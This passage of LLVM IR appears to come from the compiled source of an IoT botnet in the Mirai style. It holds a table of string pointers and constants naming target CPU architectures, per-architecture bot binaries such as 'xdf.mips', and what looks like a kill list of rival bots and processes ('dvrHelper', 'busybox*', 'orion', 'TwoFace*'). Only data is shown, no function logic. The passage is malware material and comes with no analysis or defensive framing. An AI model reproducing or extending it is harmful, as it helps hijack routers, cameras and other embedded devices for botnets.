0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.416, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.419, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.421, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.425, i32 0, i32 0)], align 16
@.str.77 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"mips64\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"sh2eb\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"sh2elf\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"armv5\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"armv4tl\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"armv4\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"armv6\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"powerpc\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"powerpc440fp\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.93 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"earyzq\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"cemtop\00", align 1
@.str.97 = private unnamed_addr constant [7 x i8] c"vtyhat\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"vvglma\00", align 1
@.str.99 = private unnamed_addr constant [7 x i8] c"nvitpj\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"razdzn\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"lnkfmx\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"qvmxvl\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"ajoomk\00", align 1
@.str.104 = private unnamed_addr constant [7 x i8] c"fwdfvf\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"atxhua\00", align 1
@.str.106 = private unnamed_addr constant [7 x i8] c"qtmzbn\00", align 1
@.str.107 = private unnamed_addr constant [7 x i8] c"adcvds\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"amsjkfbns\00", align 1
@.str.109 = private unnamed_addr constant [9 x i8] c"xdf.mips\00", align 1
@.str.110 = private unnamed_addr constant [6 x i8] c"xdf.*\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"xdf*\00", align 1
@.str.112 = private unnamed_addr constant [11 x i8] c"xdf.mipsel\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"xdf.x86_64\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"xdf.arm7\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"xdf.ppc\00", align 1
@.str.116 = private unnamed_addr constant [16 x i8] c"hex**hexxdf.sh4\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"hack*\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"arm*tel*b1\00", align 1
@.str.121 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.122 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.125 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.126 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.127 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.129 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.130 = private unnamed_addr constant [6 x i8] c"orion\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"lol*\00", align 1
@.str.132 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.133 = private unnamed_addr constant [8 x i8] c"badbox*\00", align 1
@.str.134 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.135 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.136 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.137 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.138 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.140 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.142 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.145 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.146 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.147 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.148 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.149 = private unnamed_addr constant [4 x i8] c"xx*\00", align 1
@.str.150 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.158 = private unnamed_addr constant [2 x i8] c"8\00", align 1
